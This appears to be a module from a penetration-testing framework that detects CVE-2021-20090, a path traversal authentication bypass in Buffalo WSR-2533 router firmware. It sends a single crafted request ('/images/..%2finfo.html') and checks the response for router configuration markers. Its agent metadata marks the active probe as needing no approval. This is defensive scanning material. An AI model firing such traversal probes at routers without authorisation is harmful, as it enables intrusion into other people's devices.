#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Buffalo WSR-2533DHPL2 firmware version <= 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Buffalo WSR-2533DHPL2 - Path Traversal Detection',
        'description': 'Buffalo WSR-2533DHPL2 firmware version <= 1.02 and WSR-2533DHP3 firmware version <= 1.24 are susceptible to a path traversal vulnerability that could allow unauthenticated remote attackers to bypass authentication in their web interfaces.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'lfi', 'buffalo', 'firmware', 'iot', 'kev', 'tenable', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.tenable.com/security/research/tra-2021-13',
            'https://medium.com/tenable-techblog/bypassing-authentication-on-arcadyan-routers-with-cve-2021-20090-and-rooting-some-buffalo-ea1dd30980c2',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-20090',
            'https://www.kb.cert.org/vuls/id/914124',
            'https://www.secpod.com/blog/arcadyan-based-routers-and-modems-under-active-exploitation/',
        ],
        'cve': 'CVE-2021-20090',
    }

    def run(self):
        path = '/images/..%2finfo.html'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Referer': '{{BaseURL}}/info.html'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('URLToken(cgi_path)', 'pppoe', 'wan',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='Buffalo WSR-2533DHPL2 - Path Traversal detected', path=path)
            return True
        return False

